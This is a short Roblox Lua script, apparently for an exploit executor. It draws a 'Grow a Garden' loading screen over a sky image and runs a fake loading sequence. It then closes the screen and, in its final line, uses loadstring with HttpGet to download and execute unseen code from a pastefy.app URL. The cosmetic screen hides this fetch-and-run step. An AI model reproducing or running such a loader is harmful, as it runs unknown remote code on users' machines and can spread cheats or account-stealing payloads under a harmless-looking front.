-- Loading Screen with sky background and "Grow a Garden" title
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "LoadingScreen"

-- Sky Background
local Background = Instance.new("ImageLabel", ScreenGui)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.Image = "rbxassetid://17083603341" -- Sky image
Background.ScaleType = Enum.ScaleType.Crop
Background.BackgroundTransparency = 0

-- Title Text
local Title = Instance.new("TextLabel", ScreenGui)
Title.Size = UDim2.new(0.8, 0, 0.2, 0)
Title.Position = UDim2.new(0.1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Text = "🌱 Grow a Garden 🌱"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.ZIndex = 2

-- Fake Loading
wait(2)
Title.Text = "✅ Loaded!"
wait(1)

ScreenGui:Destroy()
loadstring(game:HttpGet("https://pastefy.app/NSH81k1J/raw"))()
